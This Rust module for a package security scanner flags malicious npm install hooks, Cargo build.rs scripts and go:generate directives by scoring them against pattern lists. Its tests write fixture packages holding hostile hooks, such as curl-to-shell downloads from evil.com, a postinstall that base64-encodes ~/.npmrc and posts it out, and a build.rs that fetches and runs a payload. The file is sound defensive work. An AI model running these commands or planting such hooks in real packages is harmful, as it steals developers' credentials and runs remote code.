//! Lifecycle script analysis for detecting malicious package hooks.
//!
//! Covers:
//! - npm: preinstall, postinstall, install, prepare scripts in package.json
//! - Cargo: build.rs scripts that run at compile time
//! - Go: //go:generate directives

use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::path::Path;

use super::inspect::Capability;

/// A lifecycle script found in a package.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LifecycleScript {
    pub ecosystem: String,
    pub script_type: LifecycleScriptType,
    pub file: String,
    pub content: String,
    pub capabilities: Vec<Capability>,
    pub risk_score: f64,
    pub risk_signals: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum LifecycleScriptType {
    NpmPreinstall,
    NpmPostinstall,
    NpmInstall,
    NpmPrepare,
    CargoBuildScript,
    GoGenerate,
}

/// Dangerous patterns in lifecycle scripts (shell commands, npm scripts, go:generate).
const DANGEROUS_SCRIPT_PATTERNS: &[(&str, &str, f64)] = &[
    // Network fetching
    ("curl ", "network_fetch", 3.0),
    ("wget ", "network_fetch", 3.0),
    ("invoke-webrequest", "network_fetch", 3.0),
    ("fetch(", "network_fetch", 3.0),
    ("http.get(", "network_fetch", 3.0),
    ("https.get(", "network_fetch", 3.0),
    // Code execution
    ("node -e", "code_exec", 4.0),
    ("python -c", "code_exec", 4.0),
    ("python3 -c", "code_exec", 4.0),
    ("eval ", "code_exec", 4.0),
    ("eval(", "code_exec", 4.0),
    ("exec(", "code_exec", 4.0),
    ("sh -c", "code_exec", 3.0),
    ("bash -c", "code_exec", 3.0),
    ("powershell -", "code_exec", 3.0),
    // Encoding/obfuscation
    ("base64", "obfuscation", 3.0),
    ("buffer.from(", "obfuscation", 2.0),
    ("atob(", "obfuscation", 2.0),
    ("btoa(", "obfuscation", 2.0),
    // Environment/credential access
    ("process.env", "env_access", 2.0),
    ("os.environ", "env_access", 2.0),
    ("$home", "env_access", 1.5),
    ("$path", "env_access", 1.0),
    (".ssh/", "credential_access", 3.0),
    (".aws/", "credential_access", 3.0),
    (".npmrc", "credential_access", 4.0),
    ("npm token", "credential_access", 4.0),
    // Pipe to shell (classic attack pattern)
    ("| sh", "pipe_to_shell", 5.0),
    ("| bash", "pipe_to_shell", 5.0),
    ("|sh", "pipe_to_shell", 5.0),
    ("|bash", "pipe_to_shell", 5.0),
];

/// Dangerous patterns specific to Rust build.rs files.
const RUST_BUILD_PATTERNS: &[(&str, &str, f64)] = &[
    ("Command::new(", "process_spawn", 2.0),
    ("std::process::Command", "process_spawn", 2.0),
    ("std::net::", "network_access", 3.0),
    ("reqwest::", "network_access", 3.0),
    ("ureq::", "network_access", 3.0),
    ("hyper::", "network_access", 3.0),
    ("std::fs::write", "fs_write", 1.5),
    ("std::fs::remove", "fs_delete", 2.0),
    ("std::env::var(", "env_access", 1.0),
    ("env!(", "env_access", 0.5),
    ("include_bytes!", "binary_embed", 1.0),
];

/// Scan npm package.json for lifecycle scripts.
pub fn scan_npm_lifecycle(package_json_path: &Path) -> Vec<LifecycleScript> {
    let content = match std::fs::read_to_string(package_json_path) {
        Ok(c) => c,
        Err(_) => return vec![],
    };

    let json: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(_) => return vec![],
    };

    let scripts = match json.get("scripts").and_then(|s| s.as_object()) {
        Some(s) => s,
        None => return vec![],
    };

    let lifecycle_keys: &[(&str, LifecycleScriptType)] = &[
        ("preinstall", LifecycleScriptType::NpmPreinstall),
        ("postinstall", LifecycleScriptType::NpmPostinstall),
        ("install", LifecycleScriptType::NpmInstall),
        ("prepare", LifecycleScriptType::NpmPrepare),
    ];

    let mut results = Vec::new();

    for (key, script_type) in lifecycle_keys {
        if let Some(script_val) = scripts.get(*key).and_then(|v| v.as_str()) {
            let (score, signals) = score_script_content(script_val);
            results.push(LifecycleScript {
                ecosystem: "npm".to_string(),
                script_type: script_type.clone(),
                file: package_json_path.to_string_lossy().to_string(),
                content: script_val.to_string(),
                capabilities: extract_script_capabilities(script_val),
                risk_score: score,
                risk_signals: signals,
            });
        }
    }

    results
}

/// Scan a Cargo build.rs file for dangerous patterns.
pub fn scan_cargo_build_script(build_rs_path: &Path) -> Option<LifecycleScript> {
    let content = match std::fs::read_to_string(build_rs_path) {
        Ok(c) => c,
        Err(_) => return None,
    };

    let mut score = 0.0_f64;
    let mut signals = Vec::new();
    let mut caps = HashSet::new();

    for (pattern, signal, s) in RUST_BUILD_PATTERNS {
        if content.contains(pattern) {
            score += s;
            if !signals.contains(&signal.to_string()) {
                signals.push(signal.to_string());
            }
            // Map signals to capabilities
            match *signal {
                "network_access" => {
                    caps.insert(Capability::Network);
                }
                "process_spawn" => {
                    caps.insert(Capability::Process);
                }
                "env_access" => {
                    caps.insert(Capability::EnvironmentAccess);
                }
                "fs_write" | "fs_delete" => {
                    caps.insert(Capability::Filesystem);
                }
                "binary_embed" => {
                    caps.insert(Capability::Encoding);
                }
                _ => {}
            }
        }
    }

    // Network in build.rs is almost always suspicious
    if caps.contains(&Capability::Network) {
        score += 3.0;
        if !signals.contains(&"network_in_build_script".to_string()) {
            signals.push("network_in_build_script".to_string());
        }
    }

    // Process spawning + network combined is highly suspicious
    if caps.contains(&Capability::Process) && caps.contains(&Capability::Network) {
        score += 2.0;
        signals.push("process_and_network_in_build".to_string());
    }

    score = score.min(10.0);

    // Only report if there are non-trivial signals.
    // Most build.rs files use env vars and Command::new for compilation, which is normal.
    if score > 2.0 || !signals.is_empty() {
        Some(LifecycleScript {
            ecosystem: "cargo".to_string(),
            script_type: LifecycleScriptType::CargoBuildScript,
            file: build_rs_path.to_string_lossy().to_string(),
            content: truncate(&content, 500),
            capabilities: caps.into_iter().collect(),
            risk_score: score,
            risk_signals: signals,
        })
    } else {
        None
    }
}

/// Scan Go source files for //go:generate directives.
pub fn scan_go_generate(project_dir: &Path) -> Vec<LifecycleScript> {
    let mut results = Vec::new();

    walk_files(project_dir, "go", &mut |path, content| {
        for line in content.lines() {
            let trimmed = line.trim();
            if trimmed.starts_with("//go:generate") {
                let cmd = trimmed
                    .strip_prefix("//go:generate")
                    .unwrap_or("")
                    .trim();
                let (score, signals) = score_script_content(cmd);
                results.push(LifecycleScript {
                    ecosystem: "go".to_string(),
                    script_type: LifecycleScriptType::GoGenerate,
                    file: path.to_string_lossy().to_string(),
                    content: cmd.to_string(),
                    capabilities: extract_script_capabilities(cmd),
                    risk_score: score,
                    risk_signals: signals,
                });
            }
        }
    });

    results
}

/// Scan an extracted package directory for all lifecycle scripts.
pub fn scan_package_lifecycle(dir: &Path) -> Vec<LifecycleScript> {
    let mut results = Vec::new();

    // npm
    let pkg_json = dir.join("package.json");
    if pkg_json.exists() {
        results.extend(scan_npm_lifecycle(&pkg_json));
    }

    // Cargo
    let build_rs = dir.join("build.rs");
    if build_rs.exists() {
        if let Some(ls) = scan_cargo_build_script(&build_rs) {
            results.push(ls);
        }
    }

    // Go
    if dir.join("go.mod").exists() {
        results.extend(scan_go_generate(dir));
    }

    results
}

/// Score a script command/content for dangerous patterns.
fn score_script_content(content: &str) -> (f64, Vec<String>) {
    let mut score = 0.0_f64;
    let mut signals = Vec::new();
    let lower = content.to_lowercase();

    for (pattern, signal, s) in DANGEROUS_SCRIPT_PATTERNS {
        if lower.contains(pattern) {
            score += s;
            if !signals.contains(&signal.to_string()) {
                signals.push(signal.to_string());
            }
        }
    }

    (score.min(10.0), signals)
}

/// Extract high-level capabilities from a script string.
fn extract_script_capabilities(script: &str) -> Vec<Capability> {
    let mut caps = HashSet::new();
    let lower = script.to_lowercase();

    if lower.contains("curl")
        || lower.contains("wget")
        || lower.contains("fetch")
        || lower.contains("http")
    {
        caps.insert(Capability::Network);
    }
    if lower.contains("eval")
        || lower.contains("exec")
        || lower.contains("sh -c")
        || lower.contains("node -e")
    {
        caps.insert(Capability::Process);
    }
    if lower.contains("base64") || lower.contains("atob") || lower.contains("buffer.from") {
        caps.insert(Capability::Encoding);
    }
    if lower.contains("process.env")
        || lower.contains("os.environ")
        || lower.contains("$home")
        || lower.contains(".ssh")
        || lower.contains(".aws")
        || lower.contains(".npmrc")
    {
        caps.insert(Capability::EnvironmentAccess);
    }

    caps.into_iter().collect()
}

/// Walk files with a given extension in a directory.
fn walk_files(dir: &Path, ext: &str, callback: &mut dyn FnMut(&Path, &str)) {
    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return,
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if name.starts_with('.') || name == "vendor" || name == "node_modules" {
                continue;
            }
            walk_files(&path, ext, callback);
        } else if path.extension().map(|e| e == ext).unwrap_or(false) {
            if let Ok(content) = std::fs::read_to_string(&path) {
                callback(&path, &content);
            }
        }
    }
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}...", &s[..max.saturating_sub(3)])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn npm_preinstall_with_curl_pipe_sh() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{
            "name": "evil-pkg",
            "scripts": {
                "preinstall": "curl https://evil.com/payload.sh | sh"
            }
        }"#,
        )
        .unwrap();

        let results = scan_npm_lifecycle(&dir.path().join("package.json"));
        assert_eq!(results.len(), 1);
        assert!(matches!(
            results[0].script_type,
            LifecycleScriptType::NpmPreinstall
        ));
        assert!(
            results[0].risk_score >= 5.0,
            "curl|sh should score high, got {}",
            results[0].risk_score
        );
        assert!(results[0]
            .risk_signals
            .contains(&"pipe_to_shell".to_string()));
        assert!(results[0]
            .risk_signals
            .contains(&"network_fetch".to_string()));
    }

    #[test]
    fn npm_postinstall_with_node_eval() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{
            "name": "sneaky",
            "scripts": {
                "postinstall": "node -e \"require('child_process').exec('whoami')\""
            }
        }"#,
        )
        .unwrap();

        let results = scan_npm_lifecycle(&dir.path().join("package.json"));
        assert_eq!(results.len(), 1);
        assert!(results[0].risk_score >= 4.0);
        assert!(results[0]
            .risk_signals
            .contains(&"code_exec".to_string()));
    }

    #[test]
    fn npm_safe_build_script() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{
            "name": "safe-pkg",
            "scripts": {
                "build": "tsc && rollup -c",
                "test": "jest"
            }
        }"#,
        )
        .unwrap();

        let results = scan_npm_lifecycle(&dir.path().join("package.json"));
        assert!(results.is_empty(), "build and test are not lifecycle hooks");
    }

    #[test]
    fn npm_npmrc_credential_access() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{
            "scripts": {
                "postinstall": "cat ~/.npmrc | base64 | curl -X POST https://evil.com -d @-"
            }
        }"#,
        )
        .unwrap();

        let results = scan_npm_lifecycle(&dir.path().join("package.json"));
        assert_eq!(results.len(), 1);
        assert!(
            results[0].risk_score >= 8.0,
            "npmrc+base64+curl should be critical, got {}",
            results[0].risk_score
        );
    }

    #[test]
    fn cargo_build_rs_with_network() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("build.rs"),
            r#"
            fn main() {
                let resp = ureq::get("https://evil.com/payload").call().unwrap();
                std::fs::write("src/generated.rs", resp.into_body().read_to_string().unwrap()).unwrap();
            }
        "#,
        )
        .unwrap();

        let result = scan_cargo_build_script(&dir.path().join("build.rs"));
        assert!(result.is_some());
        let ls = result.unwrap();
        assert!(ls.risk_score >= 3.0);
        assert!(ls.risk_signals.contains(&"network_access".to_string()));
    }

    #[test]
    fn cargo_build_rs_normal() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("build.rs"),
            r#"
            fn main() {
                println!("cargo:rerun-if-changed=build.rs");
                let out_dir = std::env::var("OUT_DIR").unwrap();
            }
        "#,
        )
        .unwrap();

        let result = scan_cargo_build_script(&dir.path().join("build.rs"));
        // Normal build.rs with just env vars should have low score
        if let Some(ls) = result {
            assert!(
                ls.risk_score <= 2.0,
                "normal build.rs scored too high: {}",
                ls.risk_score
            );
        }
    }

    #[test]
    fn go_generate_with_command() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("go.mod"), "module test\ngo 1.21\n").unwrap();
        std::fs::write(
            dir.path().join("gen.go"),
            "package main\n//go:generate curl https://evil.com/payload | sh\n",
        )
        .unwrap();

        let results = scan_go_generate(dir.path());
        assert_eq!(results.len(), 1);
        assert!(results[0].risk_score >= 5.0);
    }

    #[test]
    fn go_generate_safe_protobuf() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("gen.go"),
            "package main\n//go:generate protoc --go_out=. proto/service.proto\n",
        )
        .unwrap();

        let results = scan_go_generate(dir.path());
        assert_eq!(results.len(), 1);
        assert!(
            results[0].risk_score < 2.0,
            "safe protoc go:generate scored too high: {}",
            results[0].risk_score
        );
    }

    #[test]
    fn scan_package_lifecycle_mixed() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{
            "scripts": { "preinstall": "echo hello" }
        }"#,
        )
        .unwrap();
        std::fs::write(
            dir.path().join("build.rs"),
            "fn main() { println!(\"cargo:rerun-if-changed=build.rs\"); }",
        )
        .unwrap();

        let results = scan_package_lifecycle(dir.path());
        // Should find the npm preinstall (even benign ones are reported)
        assert!(results
            .iter()
            .any(|r| matches!(r.script_type, LifecycleScriptType::NpmPreinstall)));
    }

    #[test]
    fn npm_multiple_lifecycle_hooks() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{
            "scripts": {
                "preinstall": "echo before",
                "postinstall": "echo after",
                "install": "echo during",
                "prepare": "echo prep"
            }
        }"#,
        )
        .unwrap();

        let results = scan_npm_lifecycle(&dir.path().join("package.json"));
        assert_eq!(results.len(), 4, "all four lifecycle hooks should be found");
    }

    #[test]
    fn npm_no_scripts_section() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{ "name": "bare-pkg", "version": "1.0.0" }"#,
        )
        .unwrap();

        let results = scan_npm_lifecycle(&dir.path().join("package.json"));
        assert!(results.is_empty());
    }

    #[test]
    fn cargo_build_rs_process_and_network() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("build.rs"),
            r#"
            use std::process::Command;
            fn main() {
                let data = ureq::get("https://evil.com/bin").call().unwrap();
                Command::new("sh").arg("-c").arg("chmod +x payload && ./payload").status().unwrap();
            }
        "#,
        )
        .unwrap();

        let result = scan_cargo_build_script(&dir.path().join("build.rs"));
        assert!(result.is_some());
        let ls = result.unwrap();
        assert!(
            ls.risk_signals
                .contains(&"process_and_network_in_build".to_string()),
            "should flag process+network combo"
        );
        assert!(ls.risk_score >= 7.0, "process+network should score very high, got {}", ls.risk_score);
    }
}
